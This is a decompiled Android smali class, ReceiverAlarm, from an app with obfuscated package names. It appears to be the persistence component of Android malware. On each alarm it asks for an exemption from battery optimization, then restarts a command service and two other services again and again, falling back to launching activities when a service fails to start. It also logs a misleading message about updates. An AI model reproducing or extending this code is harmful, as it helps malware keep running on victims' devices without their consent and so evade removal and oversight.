.class public Lnaqsl/ebxcb/exu/Receiver/ReceiverAlarm;
.super Landroid/content/BroadcastReceiver;
.source ""


# instance fields
.field fddo:Lnaqsl/ebxcb/exu/int;


# direct methods
.method public constructor <init>()V
    .registers 2

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/Receiver/ReceiverAlarm;->fddo:Lnaqsl/ebxcb/exu/int;

    return-void
.end method


# virtual methods
.method fddo(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 7

    sget p2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/high16 v0, 0x10000000

    const/16 v1, 0x17

    if-lt p2, v1, :cond_4d

    :try_start_8
    const-string p2, "power"

    invoke-virtual {p1, p2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p2

    check-cast p2, Landroid/os/PowerManager;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p2, v1}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result p2

    if-nez p2, :cond_4d

    iget-object p2, p0, Lnaqsl/ebxcb/exu/Receiver/ReceiverAlarm;->fddo:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {p2, p1}, Lnaqsl/ebxcb/exu/int;->new(Landroid/content/Context;)Z

    move-result p2

    if-eqz p2, :cond_4d

    new-instance p2, Landroid/content/Intent;

    const-string v1, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "package:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-direct {p2, v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    invoke-virtual {p2, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {p2, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, p2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_4d
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_4d} :catch_4d

    :catch_4d
    :cond_4d
    const-string p2, "ERROR"

    const-string v1, "new updates something went wrong: receiver alarm working "

    invoke-static {p2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    const/4 p2, 0x1

    const/4 v1, 0x0

    :try_start_56
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lnaqsl/ebxcb/exu/ServiceCommands;

    invoke-direct {v2, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_60
    .catch Ljava/lang/Exception; {:try_start_56 .. :try_end_60} :catch_62

    const/4 v2, 0x1

    goto :goto_63

    :catch_62
    const/4 v2, 0x0

    :goto_63
    if-nez v2, :cond_72

    :try_start_65
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lnaqsl/ebxcb/exu/ServiceCommands;

    invoke-direct {v2, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v2, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_72
    .catch Ljava/lang/Exception; {:try_start_65 .. :try_end_72} :catch_72

    :catch_72
    :cond_72
    :try_start_72
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lnaqsl/ebxcb/exu/StartWhileRequest;

    invoke-direct {v2, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_7c
    .catch Ljava/lang/Exception; {:try_start_72 .. :try_end_7c} :catch_7e

    const/4 v2, 0x1

    goto :goto_7f

    :catch_7e
    const/4 v2, 0x0

    :goto_7f
    if-nez v2, :cond_8e

    :try_start_81
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lnaqsl/ebxcb/exu/StartWhileRequest;

    invoke-direct {v2, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v2, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_8e
    .catch Ljava/lang/Exception; {:try_start_81 .. :try_end_8e} :catch_8e

    :catch_8e
    :cond_8e
    :try_start_8e
    iget-object v2, p0, Lnaqsl/ebxcb/exu/Receiver/ReceiverAlarm;->fddo:Lnaqsl/ebxcb/exu/int;

    const-class v3, Lnaqsl/ebxcb/exu/StartWhileGlobal;

    invoke-virtual {v2, p1, v3}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v2

    if-nez v2, :cond_a5

    new-instance v2, Landroid/content/Intent;

    const-class v3, Lnaqsl/ebxcb/exu/StartWhileGlobal;

    invoke-direct {v2, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_a2
    .catch Ljava/lang/Exception; {:try_start_8e .. :try_end_a2} :catch_a4

    const/4 v1, 0x1

    goto :goto_a5

    :catch_a4
    nop

    :cond_a5
    :goto_a5
    if-nez v1, :cond_be

    :try_start_a7
    iget-object p2, p0, Lnaqsl/ebxcb/exu/Receiver/ReceiverAlarm;->fddo:Lnaqsl/ebxcb/exu/int;

    const-class v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;

    invoke-virtual {p2, p1, v1}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result p2

    if-nez p2, :cond_be

    new-instance p2, Landroid/content/Intent;

    const-class v1, Lnaqsl/ebxcb/exu/StartWhileGlobal;

    invoke-direct {p2, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p2, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, p2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_be
    .catch Ljava/lang/Exception; {:try_start_a7 .. :try_end_be} :catch_be

    :catch_be
    :cond_be
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 3

    invoke-virtual {p0, p1, p2}, Lnaqsl/ebxcb/exu/Receiver/ReceiverAlarm;->fddo(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method
